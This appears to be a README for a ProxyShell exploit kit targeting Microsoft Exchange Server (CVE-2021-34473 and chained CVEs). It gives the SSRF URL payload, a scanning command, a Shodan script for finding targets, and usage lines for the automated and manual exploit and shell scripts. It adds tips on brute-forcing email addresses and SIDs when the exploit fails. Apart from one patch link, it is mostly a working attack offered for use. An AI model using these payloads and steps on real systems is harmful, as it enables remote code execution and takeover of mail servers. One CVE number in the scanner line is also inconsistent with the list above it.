# ProxyShell (CVE-2021-34473)
CVE-2021-34473 Microsoft Exchange Server Remote Code Execution Vulnerability.
This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL, it’s still powerful enough for us to conduct further attacks with arbitrary backend access.


* CVE-2021-34523 - Exchange PowerShell Backend Elevation-of-Privilege
* CVE-2021-31207 - Post-auth Arbitrary-File-Write





## Scanner
nuclei scanner for Proxyshell RCE (CVE-2021-34423,CVE-2021-34473,CVE-2021-31207) discovered by orange tsai in Pwn2Own, which affect microsoft exchange server.
```
nuclei -u target.com -t proxyshell.yaml
```

```
https://xxx.xxx.xxx.xxx/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com
```

## shodan target 
```python
sudo python3 shodan-query.py
```


## Usage
```python
sudo python3 ProxyShell.py -u https://<IP>
```



### Features
* No email address needs to be supplied
* Attempts to enumerate emails from Active Directory
* Attempts to enumerate LegacyDNs from Active Directory
* Attempts to discover LegacyDNs from builtin emails
* Attempts to discover SID of Exchange server in load-balanced deployments
* Handles exploitation in load-balanced environments



### manual pentest
```python
 python2 /manual/check.py 
 sudo python3 /manual/proxyshell.py
 python2 /manual/shell.py 
```


### Tips:
* recon target to find valid email address
* if you do not find any email, use bruteforce target with your email file.
* in some target automation exploit not work, you should bruteforce SID and replace in SID=500



### Mitigations
Apply the security updates found here: [CVE-2021-34473](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473)

<img src="/img/1.png" width="800px" />
<img src="/img/2.png" width="800px" />
<img src="/img/3.png" width="800px" />
<img src="/img/4.png" width="800px" />
<img src="/img/5.png" width="800px" />

### Reference
* [proxylogon orange](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
* [proxylogon orange 2](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
* [python2](https://www.how2shout.com/linux/how-to-install-python-2-7-on-ubuntu-20-04-lts/)

